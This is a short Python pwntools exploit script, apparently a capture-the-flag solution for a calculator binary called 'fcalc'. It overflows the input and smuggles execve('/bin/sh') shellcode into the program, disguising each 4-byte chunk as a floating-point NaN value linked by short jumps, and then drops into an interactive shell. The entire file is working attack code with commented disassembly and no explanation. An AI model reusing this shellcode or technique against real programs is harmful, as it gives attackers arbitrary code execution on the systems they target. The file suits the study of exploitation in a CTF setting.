from pwn import *
context.arch='amd64'
context.terminal = ['tmux','split','-hp','60']
# context.log_level='debug'

filename = "./fcalc"
io = process([filename])

payload = b'1 1 0'.ljust(0x40, b'a')
payload += pack(0x7FFFFFFFFFFFFFFF) * 2 # padding

jmpn = b"\xEB\x02"
NaNHeader = b"\xFF\x7F"
# 0:  31 c0                   xor    eax,eax
# 2:  31 db                   xor    ebx,ebx
# 4:  66 b8 3b 00             mov    ax,0x3b
# 8:  66 bb 68 00             mov    bx,0x68
# c:  48 c1 e3 10             shl    rbx,0x10
# 10: 66 bb 2f 73             mov    bx,0x732f
# 14: 48 c1 e3 10             shl    rbx,0x10
# 18: 66 bb 69 6e             mov    bx,0x6e69
# 1c: 48 c1 e3 10             shl    rbx,0x10
# 20: 66 bb 2f 62             mov    bx,0x622f
# 24: 53                      push   rbx
# 25: 48 89 e7                mov    rdi,rsp
# 28: 31 f6                   xor    esi,esi
# 2a: 31 d2                   xor    edx,edx
# 2c: 0f 05                   syscall
payload += b'\x31\xc0\x31\xdb' + jmpn + NaNHeader
payload += b'\x66\xb8\x3b\x00' + jmpn + NaNHeader
payload += b'\x66\xbb\x68\x00' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x2f\x73' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x69\x6e' + jmpn + NaNHeader
payload += b'\x48\xc1\xe3\x10' + jmpn + NaNHeader
payload += b'\x66\xbb\x2f\x62' + jmpn + NaNHeader
payload += b'\x53\x48\x89\xe7' + jmpn + NaNHeader
payload += b'\x31\xf6\x31\xd2' + jmpn + NaNHeader
payload += b'\x0f\x05\x90\x90' + jmpn + NaNHeader

io.sendafter(b"Enter your expression:", payload)
io.interactive()
